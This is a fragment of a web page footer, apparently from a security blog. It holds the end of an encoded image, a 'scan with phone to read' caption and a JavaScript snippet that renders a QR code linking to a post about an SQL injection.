qpO6upPLgGjKmtGH3l5IcXKpaB+4iTgWM4UHw1cE71sZo/86MF10cHjoHrvyN8vNnHfkPebF//2+38CwAA//8GamCOAAAABklEQVQDAHY4NpilhqoFAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-TestInt-reUploadBase64-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 